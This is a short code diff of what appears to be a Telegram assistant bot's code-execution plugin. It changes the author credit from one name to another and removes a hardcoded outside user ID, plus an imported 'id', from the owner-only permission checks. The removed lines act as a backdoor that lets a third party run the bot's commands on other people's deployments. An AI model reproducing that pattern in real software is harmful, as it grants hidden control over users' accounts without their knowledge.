@@ -1,5 +1,5 @@
 # COPYRIGHT © BY Daisy X
-# Made By RoseLoverX
+# Made By LEGENDX22
 
 import asyncio
 import io
@@ -18,7 +18,7 @@ from .. import id
 async def _(event):
     pro = await bot.get_me()
     boy = pro.id
-    if event.sender_id == boy or event.sender_id == id or event.sender_id == 1513257955:
+    if event.sender_id == boy:
         pass
     else:
         return await event.reply("deploy your own assistant check @DaisyXoT")
@@ -71,7 +71,7 @@ async def aexec(code, smessatatus):
 async def _(event):
     pro = await bot.get_me()
     boy = pro.id
-    if event.sender_id == boy or event.sender_id == id:
+    if event.sender_id == boy:
         pass
     else:
         return await event.reply("deploy your own assistant @DaisyXoT")
